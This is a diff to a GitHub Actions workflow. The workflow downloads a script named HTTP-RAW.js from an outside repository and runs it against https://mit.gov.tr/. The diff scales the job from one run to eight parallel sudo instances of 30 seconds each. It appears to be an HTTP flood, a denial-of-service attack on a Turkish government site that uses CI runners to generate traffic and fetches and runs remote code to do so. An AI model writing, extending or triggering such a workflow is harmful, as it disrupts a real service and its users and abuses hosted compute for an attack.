@@ -1,4 +1,4 @@
-name: Ubuntu VDS 30 saniye Raw !
+name: Ubuntu VDS 30 saniye
 
 on:
   workflow_dispatch:
@@ -15,8 +15,16 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/Xandermercado800/HTTP-RAWWW/raw/refs/heads/main/HTTP-RAW.js
-          timeout 30 node HTTP-RAW.js GET https://mit.gov.tr/ 30
+          PIDS=()
+          for i in {1..8}; do
+            sudo timeout 30 node HTTP-RAW.js https://mit.gov.tr/ 30 &
+            PIDS+=($!)
+          done
           
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
       - name: OK !
         run: |
           sleep 30
